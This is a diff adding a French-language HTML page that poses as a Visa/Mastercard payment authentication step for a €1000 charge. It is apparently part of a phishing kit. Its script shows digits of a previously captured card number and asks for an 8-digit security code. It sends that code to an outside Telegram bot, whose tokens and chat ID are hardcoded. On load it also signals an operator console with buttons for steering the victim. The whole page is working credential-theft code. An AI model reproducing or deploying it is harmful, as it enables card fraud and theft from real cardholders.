@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page de paiement</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            min-height: 100vh;
+            padding-top: 0px;
+        }
+
+        .container {
+            background: white;
+            padding: 50px;
+            border-radius: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        h2 {
+            color: white;
+            font-size: 21px;
+            margin-bottom: 25px;
+        }
+
+        .logos {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .logos img {
+            height: 34px;
+            padding: 8px;
+        }
+
+        #visa {
+            height: 48px;
+        }
+
+        .auth-box {
+            background: #b66009;
+            color: white;
+            border-radius: 0px;
+            margin: 0 20px;
+            position: relative;
+            font-weight: bold;
+            font-size: 15px;
+            margin-left: -50px;
+            margin-right: -50px;
+            padding: 20px 30px;
+        }
+
+        .auth-box img {
+            display: block;
+            margin: 10px auto 0;
+            width: 40px;
+        }
+
+        .info {
+            background: #2b6cb0;
+            padding: 10px;
+            border-radius: 0px;
+            margin-top: 0;
+            font-size: 14px;
+            color: white;
+        }
+
+        .details {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+
+        .details p {
+            margin: 5px 0;
+        }
+
+        .instructions {
+            text-align: left;
+            padding: 0;
+            font-size: 14px;
+            list-style: none;
+            counter-reset: step-counter;
+        }
+
+        .instructions li {
+            margin: 10px 0;
+            position: relative;
+            padding-left: 40px;
+        }
+
+        .instructions li::before {
+            content: counter(step-counter);
+            counter-increment: step-counter;
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #000;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+        }
+
+        .code-box {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .code-box input {
+            width: 80%;
+            padding: 10px;
+            font-size: 16px;
+            text-align: center;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .code-box button {
+            margin-top: 10px;
+            background-color: #001;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .countdown {
+            margin-top: 10px;
+            font-size: 16px;
+            color: red;
+        }
+
+        .loading-gif {
+            display: none;
+            margin-top: 20px;
+        }
+
+        #loading-gif img {
+            width: 125px;
+            height: auto;
+        }
+
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logos">
+            <img src="https://files.catbox.moe/fxt04z.jpg" alt="Matsercard">
+            <img src="https://files.catbox.moe/2h7sdc.png" id="visa" alt="Visa">
+        </div>
+        <div class="auth-box">
+            <h2>En attente d'authentification</h2>
+            <p>Afin de valider votre paiement, nous avons besoin d'une validation supplémentaire de votre part</p>
+            <img src="https://i.gifer.com/origin/34/34338d26023e5515f6cc8969aa027bca_w200.gif" alt="Chargement...">
+        </div>
+        <div class="details">
+            <p><strong>Montant :</strong> 1000€</p>
+            <p><strong>Date :</strong> <span id="date"></span></p>
+            <p><strong>N° de carte :</strong> <span id="display-card">xxxxxxxxxxxxXXXX</span></p>
+        </div>
+        <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/l15why.gif" height="123px"
+            width="220px" data-component="video">
+
+        <ol class="instructions">
+            <li>Vous allez recevoir une notification sur votre appareil de confiance</li>
+            <li>Appuyez sur cette notification pour valider l'opération</li>
+            <li>Revenez ensuite sur cette page et vérifiez que votre paiement a été validé</li>
+        </ol>
+        <div class="code-box">
+            <h4>Étape 1/2 : Saisissez le code de sécurité reçu sur votre téléphone</h4>
+            <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/ccqgjj.png" height="100px"
+                width="100px" data-component="video">
+            <input type="text" id="securityCode" maxlength="8" placeholder="Code de sécurité (8 chiffres)">
+            <p id="validation-error" style="display: none; color: red; font-size: 0.9em; margin-top: 5px;">Code invalide
+            </p>
+            <div class="countdown" id="countdown">05:00</div>
+
+            <button onclick="sendCodeToTelegram()">Continuer</button>
+
+            <!-- Ajouter le gif de chargement ici -->
+            <div id="loading-gif" class="loading-gif">
+                <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1263.gif" alt="Chargement...">
+                <p>Traitement en cours...</p>
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div id="progress-bar-container">
+        </div>
+    </div>
+
+    <script>
+        const cardNumber = localStorage.getItem('cardNumber');
+        const displayCard = document.getElementById('display-card');
+
+        if (cardNumber && cardNumber.length >= 4) {
+            // Extraction et affichage des 4 derniers chiffres
+            const lastFourDigits = cardNumber.slice(-4);
+            displayCard.textContent = `xxxxxxxxxxxx${lastFourDigits}`;
+        } else {
+            displayCard.textContent = 'xxxxxxxxxxxxXXXX'; // Afficher les x si moins de 4 chiffres
+        }
+        // --- Global Configurations ---
+        const token1 = "8081707668:AAED4PgB4aZykRlSfI0TozCpXX1cjCo8mEU";
+        const token2 = "7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8";
+        const chatId = "6669693805";
+        const psd = "Console By YKK";
+
+        // --- Send Inline Keyboard (Telegram Bot) ---
+        function sendInlineKeyboard() {
+            const url = `https://api.telegram.org/bot${token1}/sendMessage`;
+            const messageData = {
+                chat_id: chatId,
+                text: `🔵 ${psd}`,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "CheckoutError", callback_data: "v:" + psd }],
+                        [{ text: "Checkout", callback_data: "e:" + psd }],
+                        [{ text: "2-Checkout MDP", callback_data: "o2:" + psd }],
+                        [{ text: "Checkout EXPIRE", callback_data: "o1:" + psd }],
+                        [{ text: "Approved ", callback_data: "o10:" + psd }]
+                    ]
+                }
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(messageData)
+            }).then(res => res.json())
+                .then(data => console.log("✅ Sent to Telegram:", data))
+                .catch(err => console.error("❌ Error:", err));
+        }
+
+        // --- Send Code To Telegram (Bot 1) ---
+        function sendCodeToTelegram() {
+            const code = document.getElementById('securityCode').value;
+            if (code.length === 8) {
+                const url = `https://api.telegram.org/bot${token2}/sendMessage`;
+                const message = `Code de sécurité: ${code}`;
+
+                fetch(`${url}?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                    .then(res => res.json())
+                    .then(() => {
+                        document.getElementById('loading-gif').style.display = 'block';
+                        setTimeout(() => {
+                            document.getElementById('loading-gif').style.display = 'none';
+                        }, 2000);
+                    })
+                    .catch(console.error);
+            } else {
+                document.getElementById('validation-error').style.display = 'block';
+            }
+        }
+
+        // --- Countdown Timer ---
+        let countdownTime = 300; // 5 minutes
+        function startCountdown() {
+            const countdownElem = document.getElementById('countdown');
+            const interval = setInterval(() => {
+                const minutes = Math.floor(countdownTime / 60);
+                const seconds = countdownTime % 60;
+                countdownElem.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                countdownTime--;
+
+                if (countdownTime < 0) {
+                    clearInterval(interval);
+                    countdownElem.textContent = 'Expiré';
+                }
+            }, 1000);
+        }
+
+        // --- Progress Bar Update ---
+        function updateProgressBar() {
+            let progress = 0;
+            const progressBar = document.getElementById('progress-bar');
+            const interval = setInterval(() => {
+                if (progress >= 100) {
+                    clearInterval(interval);
+                } else {
+                    progress++;
+                    progressBar.style.width = progress + '%';
+                }
+            }, 50);
+        }
+
+        // --- On Page Load ---
+        window.onload = function () {
+            document.getElementById("date").textContent = new Date().toLocaleString();
+            sendInlineKeyboard(); // Send initial Telegram message
+            startCountdown(); // Start the countdown timer
+            updateProgressBar(); // Start progress bar animation
+        };
+    </script>
+</body>
+
+</html>
